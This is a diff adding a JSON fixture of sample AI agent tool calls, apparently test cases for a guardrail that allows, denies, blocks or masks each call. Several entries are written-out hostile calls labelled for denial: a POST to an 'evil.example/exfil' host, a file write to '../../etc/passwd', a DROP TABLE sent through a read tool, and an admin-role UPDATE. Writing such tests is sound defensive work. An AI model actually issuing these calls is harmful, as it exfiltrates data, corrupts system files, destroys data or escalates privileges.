@@ -1,0 +1,44 @@
+{
+  "calls": [
+    {
+      "call_id": "ok-search",
+      "tool": "search",
+      "arguments": { "query": "서울 날씨" }
+    },
+    {
+      "call_id": "ok-db-read",
+      "tool": "db_read",
+      "arguments": { "sql": "SELECT id, status FROM orders LIMIT 10" }
+    },
+    {
+      "call_id": "deny-db-write",
+      "tool": "db_write",
+      "arguments": { "sql": "UPDATE users SET role='admin' WHERE id=1" }
+    },
+    {
+      "call_id": "review-email",
+      "tool": "email",
+      "arguments": { "to": "ops@example.com", "subject": "주간 리포트", "body": "요약 첨부" }
+    },
+    {
+      "call_id": "deny-external",
+      "tool": "external_api",
+      "arguments": { "url": "https://evil.example/exfil", "method": "POST" }
+    },
+    {
+      "call_id": "block-file-path",
+      "tool": "file_write",
+      "arguments": { "path": "../../etc/passwd", "content": "x" }
+    },
+    {
+      "call_id": "block-sql-drop",
+      "tool": "db_read",
+      "arguments": { "sql": "DROP TABLE customers" }
+    },
+    {
+      "call_id": "mask-pii-search",
+      "tool": "search",
+      "arguments": { "query": "고객 연락처 010-9999-8888" }
+    }
+  ]
+}
